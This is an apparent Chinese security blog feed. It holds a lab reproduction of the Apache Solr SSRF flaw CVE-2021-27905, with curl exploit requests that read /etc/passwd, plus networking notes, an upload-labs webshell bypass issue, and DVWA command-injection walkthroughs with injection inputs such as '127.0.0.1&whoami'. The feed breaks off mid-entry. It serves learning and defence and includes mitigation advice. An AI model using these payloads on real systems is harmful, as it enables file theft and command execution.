    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Solr是美国阿帕奇（Apache）基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器，使用Java语言开发，主要基于http和Apache Lucene实现的，该产品支持层面搜索、垂直搜索、高亮显示搜索结果等。</p><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>Apache Solr 8.8.2之前版本存在安全漏洞，Apache Solr 中的 ReplicationHandler（通常注册在 Solr core下的“&#x2F;replication”）有一个“masterUrl”（也是“leaderUrl”别名）参数，用于指定另一个 Solr core上的另一个 ReplicationHandler 将索引数据复制到本地core。为了防止 SSRF 漏洞，Solr 应该根据它用于“shards”参数的类似配置检查这些参数。攻击者可利用该漏洞，传递特定参数，构造并执行服务端请求伪造，造成攻击者任意读取服务器上的文件，利用该漏洞可造成内网信息探测。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><blockquote><p>ApacheSolr&lt;8.8.2</p></blockquote><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">http://archive.apache.org/dist/lucene/solr/8.8.1/</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128004036346.png" alt="image-20231128004036346"></p><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo tar -xvf solr-8.8.1.tgz <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128004638198.png" alt="image-20231128004638198"></p><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd solr-8.8.1/bin/<br>ls<br>./solr start-p9977<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128004936110.png" alt="image-20231128004936110"></p><p>发现报错了，缺少了java环境</p><h2 id="安装java环境"><a href="#安装java环境" class="headerlink" title="安装java环境"></a>安装java环境</h2><p>安装jdk8</p><p>搜索jdk8版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt search java | grep jdk<br></code></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install openjdk-8-jre-headless <br>sudo apt install openjdk-8-jdk-headless<br></code></pre></td></tr></table></figure><h2 id="运行solr"><a href="#运行solr" class="headerlink" title="运行solr"></a>运行solr</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/solr-8.8.1/bin<br>./solr start -p 9977<br></code></pre></td></tr></table></figure><p>这个地方会有问题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128095259509.png" alt="image-20231128095259509"></p><p>没有权限，添加一个权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo chown -R ubuntu:ubuntu ~/solr-8.8.1/<br></code></pre></td></tr></table></figure><p>运行solr</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128095358676.png" alt="image-20231128095358676"></p><p>服务就启动了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128125725755.png" alt="image-20231128125725755"></p><p>创建一个core</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128130221973.png" alt="image-20231128130221973"></p><p>出现报错</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128130256111.png" alt="image-20231128130256111"></p><p>将server&#x2F;solr&#x2F;configsets&#x2F;default&#x2F;conf复制到new_core</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ~/solr-8.8.1/server/solr<br>cp -r configsets/_default/conf   new_core<br></code></pre></td></tr></table></figure><p>然后再次创建就能成功创建了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128131137838.png" alt="image-20231128131137838"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>当前使用kali linux操作，使用ssh远程连接</p><p>攻击机kali监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 19977<br></code></pre></td></tr></table></figure><p>然后</p><p>使用payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl http://192.168.157.45:9977/solr/new_core/replication?command=fetchindex&amp;masterUrl=http://192.168.157.114:19977<br></code></pre></td></tr></table></figure><p>但是这里又有一个问题</p><p>使用curl访问的时候会出现问题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128142414487.png" alt="image-20231128142414487"></p><p>但是直接使用浏览器访问就会成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128142519662.png" alt="image-20231128142519662"></p><p>这个是因为传入参数的时候使用了<code>&amp;</code>符号，但是在linux命令行的<code>&amp;</code>是连接两个命令的符号，所以会出现报错，解决办法是，使用<code>\</code>转义一下，就可以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl http://192.168.157.45:9977/solr/new_core/replication?command=fetchindex\&amp;masterUrl=http://192.168.157.114:19977 <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128142936024.png" alt="image-20231128142936024"></p><p>这个就是说明这个存在SSRF漏洞</p><blockquote><p>为什么能判断存在漏洞存在SSRF漏洞？</p><p>因为masterUrl&#x3D;<a href="http://192.168.157.114:19977/">http://192.168.157.114:19977</a> 是我们的地址，并且不是一个有效的数据源</p></blockquote><p>尝试漏洞利用</p><p>先开启远程文件读取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -i -s -k -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; --data-binary &#x27;&#123;&quot;set-property&quot;:&#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27; http://192.168.157.45:9977/solr/new_core/config<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128152624108.png" alt="image-20231128152624108"></p><p>使用<code>file://</code>协议访问服务器的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -i -s -k &#x27;http://192.168.157.45:9977/solr/new_core/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;     <br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-27905/image-20231128152948186.png" alt="image-20231128152948186"></p><h1 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h1><ol><li><p>升级 Solr 版本大于等于8.8.2</p><blockquote><p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p></blockquote></li><li><p>禁用流传输功能</p></li><li><p>限制访问，限制特殊的IP访问Solr的API，也就是说防止未授权访问</p></li><li><p>定期检查配置，防止客户端修服务器的配置</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/2023/11/27/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/11/27/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层</title>
    <link href="/2023/11/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/"/>
    <url>/2023/11/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127134341136.png" alt="image-20231127134341136"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127134513728.png" alt="image-20231127134513728"></p><ol><li>注意DNS是属于应用层</li></ol><h1 id="C-x2F-S-和-P2P"><a href="#C-x2F-S-和-P2P" class="headerlink" title="C&#x2F;S   和   P2P"></a>C&#x2F;S   和   P2P</h1><h2 id="C-x2F-S"><a href="#C-x2F-S" class="headerlink" title="C&#x2F;S"></a>C&#x2F;S</h2><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127135436317.png" alt="image-20231127135436317"></p><h2 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127135558461.png" alt="image-20231127135558461"></p><p>P2P通信的双方是平等的</p><h1 id="DHCP动态主机就配置协议"><a href="#DHCP动态主机就配置协议" class="headerlink" title="DHCP动态主机就配置协议"></a>DHCP动态主机就配置协议</h1><p>这个是UDP服务，注意端口</p><h2 id="客户主机申请IP的过程"><a href="#客户主机申请IP的过程" class="headerlink" title="客户主机申请IP的过程"></a>客户主机申请IP的过程</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127140327530.png" alt="image-20231127140327530"></p><p>这个步骤的简单描述</p><ol><li><p>首先是DHCP客户端发送广播（不知道有几个DHCP服务器）寻找DHCP服务器</p></li><li><p>然后DHCP 收到信息，发送自己的位置，并且封装了IP地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127140905874.png" alt="image-20231127140905874"></p><p>当多个DHPC 发送报文给客户时，客户会选择先到的那个</p></li><li><p>客户端使用0.0.0.0（因为这个时候选择了DHCP，还没有的得到DHCP服务器的同意）地址发送数据。发送了这个歌报文之后才能正常的使用IP地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127141229291.png" alt="image-20231127141229291"></p></li><li><p>DHCP发送广播之后，客户端就能正常的使用IP地址了，但是请注意这个时候还是广播地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127141345862.png" alt="image-20231127141345862"></p><p>在接受到IP地址的时候客户端会使用ARP确定没有人使用这个IP地址，如果发现有主机使用这个IP那么就会发送DCHP谢绝报文，来谢绝这个IP，并且会重新发送这个报文</p></li><li><p>之后就是 和或租用期相关的报文</p></li></ol><h2 id="DHCP中继代理"><a href="#DHCP中继代理" class="headerlink" title="DHCP中继代理"></a>DHCP中继代理</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127141939812.png" alt="image-20231127141939812"></p><p>可以理解为为了防止DHCP服务器的数量太多，所以就使用路由器代理DHCP，当路由收到DCHP申请IP地址的时候，就会发送单播给DHCP服务器</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p>就是做域名解析的一个协议</p><h2 id="域名解析的过程"><a href="#域名解析的过程" class="headerlink" title="域名解析的过程"></a>域名解析的过程</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127144138529.png" alt="image-20231127144138529"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127144921835.png" alt="image-20231127144921835"></p><h1 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h1><h2 id="主动模式"><a href="#主动模式" class="headerlink" title="主动模式"></a>主动模式</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127151152387.png" alt="image-20231127151152387"></p><h2 id="被动连接"><a href="#被动连接" class="headerlink" title="被动连接"></a>被动连接</h2><p>左边是主动，右边是被动模式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127151302216.png" alt="image-20231127151302216"></p><h1 id="电子邮件"><a href="#电子邮件" class="headerlink" title="电子邮件"></a>电子邮件</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127151632630.png" alt="image-20231127151632630"></p><p>邮件的发送和读取协议时两种不同和协议。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127151805311.png" alt="image-20231127151805311"></p><h2 id="SMTP邮件发送协议"><a href="#SMTP邮件发送协议" class="headerlink" title="SMTP邮件发送协议"></a>SMTP邮件发送协议</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127151959208.png" alt="image-20231127151959208"></p><h2 id="POP3-IMAP"><a href="#POP3-IMAP" class="headerlink" title="POP3   IMAP"></a>POP3   IMAP</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E5%BA%94%E7%94%A8%E5%B1%82/image-20231127152225791.png" alt="image-20231127152225791"></p><h1 id="万维网"><a href="#万维网" class="headerlink" title="万维网"></a>万维网</h1>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uploadlabs_pass20不能使用大小写绕过</title>
    <link href="/2023/11/27/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/uploadlabs-pass20%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"/>
    <url>/2023/11/27/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/uploadlabs-pass20%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>Upload-labs  pass-20为什么无法使用大小写绕过的方式链接</p><h1 id="经历流程"><a href="#经历流程" class="headerlink" title="经历流程"></a>经历流程</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231127105429526.png" alt="image-20231127105429526"></p><p>​                               </p><p>我使用大小写绕过的方法上传，发现能直接上传</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231127105436697.png" alt="image-20231127105436697"></p><p>然后尝试使用蚁剑链接，发现不能正常访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231127105445042.png" alt="image-20231127105445042"></p><p>尝试使用url访问</p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231127105457843.png" alt="image-20231127105457843"></p><p>看upload文件夹</p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231127105504984.png" alt="image-20231127105504984"></p><p>发现是存在这个文件，而且访问是500，服务器内部发生错误</p><p>但是使用\.的方式确实能连接</p><p> <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231127105519385.png" alt="image-20231127105519385"></p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>需要降低php的版本，因为</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/5c8b0e1f92a1771eb688884ea788c86.png" alt="5c8b0e1f92a1771eb688884ea788c86"></p>]]></content>
    
    
    
    <tags>
      
      <tag>技术随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa</title>
    <link href="/2023/11/26/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/dvwa/"/>
    <url>/2023/11/26/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/dvwa/</url>
    
    <content type="html"><![CDATA[<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/dvwa/image-20231126130452818.png" alt="image-20231126130452818"></p><p>然后尝试执行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/dvwa/image-20231126134535546.png" alt="image-20231126134535546"></p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个代码没有做任何措施，直接插入命令就可以直接访问成功</p><blockquote><p><strong>stristr(string,search,before_search)</strong> ：返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。stristr — strstr() 函数的忽略大小写版本</p><p>stristr(string,search,before_search) ：搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE</p><p>string 必需。规定被搜索的字符串</p><p>search 必需。规定要搜索的字符串<br>如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符</p><p>before_search 可选。默认值为 “false” 的布尔值<br>如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分</p><p><strong>注意</strong>：</p><ul><li>该函数不区分大小写</li><li>该函数认为二进制是安全的</li></ul></blockquote><blockquote><p>php_uname ($mode) ：返回运行 PHP 的系统的有关信息，也就是返回运行 PHP 的操作系统的描述<br>$mode 是单个字符，用于定义要返回什么信息：<br>‘a’：此为默认。包含序列 “s n r v m” 里的所有模式<br>‘s’：操作系统名称。例如： FreeBSD<br>‘n’：主机名。例如：DESKTOP-XXXXXXX<br>‘r’：版本名称，例如： 5.1.2-RELEASE<br>‘v’：版本信息。操作系统之间有很大的不同<br>‘m’：机器类型。例如：i386</p></blockquote><blockquote><p>array() ：用于创建数组<br>在 PHP 中，有三种类型的数组：<br>索引数组 - 带有数字索引的数组<br>关联数组 - 带有指定的键的数组<br>多维数组 - 包含一个或多个数组的数组<br>说明：<br>array() 创建数组，带有键和值。如果在规定数组时省略了键，则生成一个整数键，这个 key 从 0 开始，然后以 1 进行递增</p><p>要用 array() 创建一个关联数组，可使用 &#x3D;&gt; 来分隔键和值</p><p>要创建一个空数组，则不传递参数给 array()：<br>$new &#x3D; array();</p></blockquote><blockquote><p>str_replace(find,replace,string,count) ：以其他字符替换字符串中的一些字符（区分大小写）<br>find 必需。规定要查找的值<br>replace 必需。规定替换 find 中的值的值<br>string 必需。规定被搜索的字符串<br>count 可选。对替换数进行计数的变量</p><p>该函数必须遵循下列规则：<br>如果搜索的字符串是数组，那么它将返回数组<br>如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换<br>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换<br>如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用<br><strong>注意：</strong></p><ul><li><p>该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索</p></li><li><p>该函数是二进制安全的</p></li></ul></blockquote><blockquote><p>array_keys(array,value,strict) ：返回包含数组中所有键名的一个新数组<br>array 必需。规定数组<br>value 可选。您可以指定键值，然后只有该键值对应的键名会被返回</p><p>strict 可选。与 value 参数一起使用。可能的值：<br>true - 返回带有指定键值的键名。依赖类型，数字 5 与字符串 “5” 是不同的<br>false - 默认值。不依赖类型，数字 5 与字符串 “5” 是相同的</p></blockquote><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><blockquote><p>127.0.0.1&amp;whoami就能获取</p></blockquote><h3 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>( <span class="hljs-comment">//只是替换</span><br>        <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the characters in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看的出来这个就是将<code>&amp;&amp;</code>,<code>;</code>替换了，我们使用其他的符号就可以了</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><blockquote><p>127.0.0.1||whoami1</p></blockquote><p>但是这里没有回显ping 的结果</p><p><img 